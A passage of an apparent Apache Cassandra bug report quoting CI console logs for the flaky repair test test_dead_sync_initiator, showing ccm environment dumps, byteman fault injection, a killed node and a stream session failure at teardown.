'/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Dcassandra.migration_task_wait_in_seconds=6'}
10:15:46 08:15:46,148 ccm INFO node3: using Java 8 for the current invocation
10:15:46 08:15:46,148 ccm INFO node3: using Java 8 for the current invocation
10:15:46 08:15:46,215 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:46 08:15:46,215 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
10:15:46 08:15:48,339 cassandra.cluster WARNING Node 127.0.0.1:9042 is reporting a schema disagreement: {UUID('e53e628c-5f76-3c2c-81a3-7cfde6b6992b'): [<DefaultEndPoint: 127.0.0.1:9042>, <DefaultEndPoint: 127.0.0.2:9042>], UUID('2207c2a9-f598-3971-986b-2926e09e239d'): [<DefaultEndPoint: 127.0.0.3:9042>]}
10:15:48 08:16:01,745 repair_tests.repair_test DEBUG Submitting byteman script to node2
10:16:01 install rule sleep 60s on stream session
10:16:01 
10:16:01 08:16:01,883 repair_tests.repair_test DEBUG repair node1
10:16:01 08:16:01,884 repair_tests.repair_test DEBUG Will kill node2 in middle of sync
10:16:01 08:16:02,4 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf'}
10:16:02 08:16:02,4 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '1c6ea049e141', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu/test/node1/conf'}
10:16:02 08:16:02,5 ccm INFO node1: using Java 8 for the current invocation
10:16:02 08:16:02,5 ccm INFO node1: using Java 8 for the current invocation
10:16:02 08:16:03,288 cassandra.cluster INFO Host 127.0.0.3:9042 may be up; will prepare queries and open connection pool
10:16:03 08:16:05,827 dtest_setup DEBUG Errors were just seen in logs, ending test (if not ending already)!
10:16:05 Exception in thread Thread-18:
10:16:05 Traceback (most recent call last):
10:16:05   File ""/usr/lib/python3.8/threading.py"", line 932, in _bootstrap_inner
10:16:05     self.run()
10:16:05   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 193, in run
10:16:05     self.scan_and_report()
10:16:05   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 186, in scan_and_report
10:16:05     on_error_call(errordata)
10:16:05   File ""/home/cassandra/cassandra/cassandra-dtest/dtest_setup.py"", line 136, in _log_error_handler
10:16:05     pytest.fail(""Error details: \n{message}"".format(message=message))
10:16:05   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/_pytest/outcomes.py"", line 97, in fail
10:16:05     raise Failed(msg=msg, pytrace=pytrace)
10:16:05 Failed: Error details: 
10:16:05 Errors seen in logs for: node3
10:16:05 node3: ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session.
10:16:05 08:16:18,911 repair_tests.repair_test DEBUG Killed node2, now waiting repair to finish
10:16:18 PASSED
10:16:18 ------------------------------ live log teardown -------------------------------
10:16:18 08:16:18,920 conftest ERROR Unexpected error in node3 log, error: 
10:16:18 ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session.
10:16:18 08:16:19,425 dtest_setup DEBUG removing ccm cluster test at: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu
10:16:19 08:16:19,677 dtest_setup DEBUG clearing ssl stores from [/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-cwwehlmu] directory
10:16:19 
10:16:19 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator ERROR
10:16:19 
10:16:19 ==================================== ERRORS ====================================
10:16:19 ___________ ERROR at teardown of TestRepair.test_dead_sync_initiator ___________
10:16:19 Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session., ERROR [Stream-Deserializer-/127.0.0.1:7000-e3a3355f] 2022-04-09 08:16:05,610 StreamSession.java:883 - [Stream #4c6cb1d0-b7dd-11ec-9c83-6541ba86dabf] Remote peer /127.0.0.1:7000 failed stream session.]
{noformat}


h5. Cassandra-4.0/374 offheap

Cassandra-4.0/374/testReport/dtest-offheap.repair_tests.repair_test/TestRepair/test_dead_sync_initiator/
 --> Cassandra-4.0-dtest-offheap/325/label=cassandra-dtest,split=50/
 --> https://nightlies.apache.org/cassandra/cassandra-4.0/Cassandra-4.0-dtest-offheap/325/Cassandra-4.0-dtest-offheap/label=cassandra-dtest,split=50/

In the stage's console we see 
{noformat}
01:32:30 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator 
01:32:30 -------------------------------- live log setup --------------------------------
01:32:30 23:32:29,913 conftest INFO Starting execution of test_dead_sync_initiator at 2022-03-29 23:32:29.913954
01:32:30 swapoff: Not superuser.
01:32:30 23:32:30,6 dtest_setup INFO cluster ccm directory: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0
01:32:30 23:32:30,103 ccm DEBUG Log-watching thread starting.
01:32:30 -------------------------------- live log call ---------------------------------
01:32:30 23:32:30,103 ccm DEBUG Log-watching thread starting.
01:32:30 23:32:30,109 repair_tests.repair_test DEBUG Setting up cluster..
01:32:30 23:32:31,527 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8981640223927331503,-7885598323692393214,-6794301213000180954,-5949924565509019197,-4509656335606435957,-3438155719266403145,-2420304314523976129,-1602632381911625335,-526876500686045796,209039192024847844,1288411999472449502,2531932005153041474,3499296248231576973,5089300800745475611,6708324096442518908,7686469548958632984', '-8329167311779082240,-7271790794850124023,-5150095894847888913,-3891675303704235879,-2827334313931172483,-1007330012951226084,869734316561759943,2038689239740774322,3087813040069965410,4023726212861480830,4439363872433120710,5651044219105101855,6048367071453814646,7306787787399257734,8341088434074662101,8767374935355791491', '-8581426908502151204,-7523870223812102645,-6281431909131970493,-5454585452393857222,-4790076750216599147,-4127945243914357911,-3065592844244006372,-1927466304854111380,-95550575899028698,618744888498632294,1735983339370329888,4807707064059896028,6440188028064160079,7073171851537294202,8051062707930782866,9198386416286459574']
01:32:31 23:32:31,527 ccm DEBUG pregenerated tokens from cmd_list: ['/home/cassandra/cassandra/tools/bin/generatetokens', '-n', '3', '-t', '16', '--rf', '3', '-p', 'Murmur3Partitioner'] are ['-8981640223927331503,-7885598323692393214,-6794301213000180954,-5949924565509019197,-4509656335606435957,-3438155719266403145,-2420304314523976129,-1602632381911625335,-526876500686045796,209039192024847844,1288411999472449502,2531932005153041474,3499296248231576973,5089300800745475611,6708324096442518908,7686469548958632984', '-8329167311779082240,-7271790794850124023,-5150095894847888913,-3891675303704235879,-2827334313931172483,-1007330012951226084,869734316561759943,2038689239740774322,3087813040069965410,4023726212861480830,4439363872433120710,5651044219105101855,6048367071453814646,7306787787399257734,8341088434074662101,8767374935355791491', '-8581426908502151204,-7523870223812102645,-6281431909131970493,-5454585452393857222,-4790076750216599147,-4127945243914357911,-3065592844244006372,-1927466304854111380,-95550575899028698,618744888498632294,1735983339370329888,4807707064059896028,6440188028064160079,7073171851537294202,8051062707930782866,9198386416286459574']
01:32:31 23:32:32,659 repair_tests.repair_test DEBUG Setting up byteman on node2
01:32:32 23:32:32,848 repair_tests.repair_test DEBUG Starting cluster..
01:32:32 23:32:32,929 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf'}
01:32:32 23:32:32,929 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf'}
01:32:32 23:32:32,929 ccm INFO node1: using Java 8 for the current invocation
01:32:32 23:32:32,929 ccm INFO node1: using Java 8 for the current invocation
01:32:32 23:32:33,9 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 